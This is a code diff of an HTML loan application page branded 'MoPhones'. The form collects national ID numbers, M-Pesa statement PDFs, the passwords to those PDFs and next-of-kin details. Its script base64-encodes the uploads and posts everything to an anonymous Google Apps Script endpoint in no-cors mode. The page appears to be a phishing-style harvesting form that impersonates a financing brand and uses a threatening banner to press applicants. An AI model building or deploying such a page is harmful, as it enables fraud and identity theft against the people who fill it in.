@@ -5,40 +5,18 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MoPhones Application</title>
     <style>
-        :root { --primary: #004488; --danger: #dc2626; --success: #16a34a; }
+        :root { --primary: #004488; --danger: #dc2626; }
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f1f5f9; padding: 15px; margin: 0; }
         .container { background: white; padding: 20px; border-radius: 15px; max-width: 480px; margin: auto; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
         .header { text-align: center; margin-bottom: 20px; }
-        
-        .strict-banner { 
-            background: #fff1f2; 
-            border: 1px solid var(--danger); 
-            color: var(--danger); 
-            padding: 12px; 
-            border-radius: 8px; 
-            font-size: 0.85em; 
-            margin-bottom: 20px; 
-            line-height: 1.4;
-        }
-
-        .price-check {
-            background: #e0f2fe;
-            padding: 10px;
-            border-radius: 8px;
-            text-align: center;
-            margin-bottom: 15px;
-            font-size: 0.9em;
-        }
+        .strict-banner { background: #fff1f2; border: 1px solid var(--danger); color: var(--danger); padding: 12px; border-radius: 8px; font-size: 0.85em; margin-bottom: 20px; text-align: center; line-height: 1.4; }
+        .price-check { background: #e0f2fe; padding: 10px; border-radius: 8px; text-align: center; margin-bottom: 15px; font-size: 0.9em; }
         .price-check a { color: var(--primary); font-weight: bold; text-decoration: none; }
-
         label { display: block; margin-top: 15px; font-weight: bold; font-size: 0.85em; color: #334155; }
         input, select { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #cbd5e1; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
-        
         .file-section { background: #f8fafc; border: 1px dashed #cbd5e1; padding: 10px; border-radius: 8px; margin-top: 5px; }
-        
-        .btn-submit { background: var(--primary); color: white; padding: 18px; border: none; border-radius: 8px; width: 100%; margin-top: 25px; font-weight: bold; font-size: 1.1em; cursor: pointer; transition: 0.3s; }
-        .btn-submit:hover { opacity: 0.9; }
-
+        .btn-submit { background: var(--primary); color: white; padding: 18px; border: none; border-radius: 8px; width: 100%; margin-top: 25px; font-weight: bold; font-size: 1.1em; cursor: pointer; }
+        .btn-submit:disabled { background: #94a3b8; }
         .contact-box { margin-top: 25px; text-align: center; border-top: 1px solid #e2e8f0; padding-top: 15px; font-size: 0.9em; }
         .contact-box a { color: var(--primary); text-decoration: none; font-weight: bold; }
         .footer { font-size: 0.7em; text-align: center; color: #94a3b8; margin-top: 20px; }
@@ -57,15 +35,15 @@
     </div>
 
     <div class="strict-banner">
-        <strong>⚠️ CRITICAL NOTICE:</strong><br>
-        Dishonesty during the subsequent <strong>Credit Call</strong> will lead to automatic credit disqualification. Ensure all data matches your documents perfectly.
+        🚨 <strong>VALIDATION ACTIVE</strong><br>
+        Dishonesty during the subsequent <strong>Credit Call</strong> will lead to automatic credit disqualification.
     </div>
 
     <form id="ironCladPortal">
         <label>Phone Model Preferred</label>
         <input type="text" name="preferred_phone" placeholder="e.g. Samsung Galaxy A15" required>
 
-        <label>Full Name (3 Names as per ID)</label>
+        <label>Full Name (Must be 3 Names)</label>
         <input type="text" name="full_name" id="nameInput" placeholder="First Middle Surname" required>
 
         <label>National ID Number</label>
@@ -91,7 +69,7 @@
         <div class="file-section"><input type="file" name="mpesa_statement" accept=".pdf" required></div>
 
         <label>M-Pesa Statement Password</label>
-        <input type="text" name="mpesa_password" id="passInput" placeholder="Enter Password to PDF" required>
+        <input type="text" name="mpesa_password" id="passInput" placeholder="Password for PDF" required>
 
         <label>Next of Kin Name</label>
         <input type="text" name="nok_name" required>
@@ -111,8 +89,9 @@
 </div>
 
 <script>
-const scriptURL = 'YOUR_GOOGLE_SCRIPT_URL_HERE'; // Replace with your actual Apps Script URL
+const scriptURL = 'https://script.google.com/macros/s/AKfycbz8ENnIsv-O9KH9uZeMZNwbK2zTMvDEI74v1OyE0BHidl_KHTFYh9PW_ptyvlVmLhQu/exec';
 const form = document.getElementById('ironCladPortal');
+const submitBtn = document.getElementById('submitBtn');
 
 form.addEventListener('submit', e => {
     e.preventDefault();
@@ -120,31 +99,49 @@ form.addEventListener('submit', e => {
     // Validations
     const nameValue = document.getElementById('nameInput').value.trim();
     if (nameValue.split(/\s+/).length < 3) {
-        alert("❌ ERROR: You must provide 3 names as they appear on your ID.");
+        alert("❌ ERROR: You must provide exactly 3 names as they appear on your ID.");
         return;
     }
 
-    const kinContact = document.getElementById('kinContact').value;
-    if (!kinContact.startsWith("+254") || kinContact.length !== 13) {
-        alert("❌ ERROR: Kin contact must be +2547XXXXXXXX");
-        return;
-    }
+    submitBtn.disabled = true;
+    submitBtn.innerText = "Uploading Files... Please wait.";
 
-    document.getElementById('submitBtn').disabled = true;
-    document.getElementById('submitBtn').innerText = "Uploading Files...";
+    const formData = {};
+    const fileInputs = form.querySelectorAll('input[type="file"]');
+    const textInputs = form.querySelectorAll('input:not([type="file"]), select');
 
-    // Use FormData to handle both text and files
-    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-      .then(response => {
-          alert("✅ SUCCESS: Your MoPhones application has been submitted for credit review. Watch for our call!");
-          form.reset();
-          window.location.reload();
-      })
-      .catch(error => {
-          alert("Network Error. Check your connection.");
-          document.getElementById('submitBtn').disabled = false;
-          document.getElementById('submitBtn').innerText = "Submit Application";
-      });
+    textInputs.forEach(input => formData[input.name] = input.value);
+
+    const promises = Array.from(fileInputs).map(input => {
+        return new Promise((resolve) => {
+            const file = input.files[0];
+            if (!file) { resolve(); return; }
+            const reader = new FileReader();
+            reader.onload = (event) => {
+                formData[input.name] = event.target.result; 
+                resolve();
+            };
+            reader.readAsDataURL(file);
+        });
+    });
+
+    Promise.all(promises).then(() => {
+        fetch(scriptURL, {
+            method: 'POST',
+            mode: 'no-cors', 
+            body: JSON.stringify(formData)
+        })
+        .then(() => {
+            alert("✅ SUCCESS: Your MoPhones application has been submitted. Prepare for the credit call!");
+            form.reset();
+            window.location.reload();
+        })
+        .catch(err => {
+            alert("Network Error. Please try again.");
+            submitBtn.disabled = false;
+            submitBtn.innerText = "Submit Application";
+        });
+    });
 });
 </script>
 
